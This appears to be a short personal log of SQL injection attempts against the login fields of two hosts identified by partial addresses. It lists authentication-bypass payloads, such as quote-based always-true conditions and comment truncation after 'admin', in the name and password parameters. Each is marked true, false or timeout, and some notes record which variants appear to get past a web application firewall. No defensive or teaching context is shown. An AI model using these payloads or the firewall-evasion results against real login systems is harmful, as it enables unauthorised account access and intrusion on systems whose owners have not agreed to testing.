# 120.114 #
## record ##
### pw ###
* name=&pw='or''=', true
* name=&pw='or'1'='1, timeout
* name=&pw="or""=", false
* name=&pw=" or "1"="1, timeout
* name=&pw=" or "1"="1"#, timeout
* name=&pw='or'1'!='2, true
 
### name ###
* name=admin'#&pw=, true
* name=admin"#&pw=, false
* name='or''=''#&pw=, true

### waf pattern ###
* 'or''=', true
* 'or'x'='x, timeout
* "or"1"="1, false
* " or"1"="1, timeout
* "or "1"="1, false
* " or "1"="1, timeout

# 140.110 #
## record ##
### pw ###
* name=&pw='or''=', true
* name=&pw='or'1'='1, true
* name=&pw="or""=", false
* name=&pw=" or "1"="1, false
* name=&pw=" or "1"="1"#, false

### name ###
* name=admin'#&pw=, true
* name=admin"#&pw=, false
* name='or''=''#&pw=, true

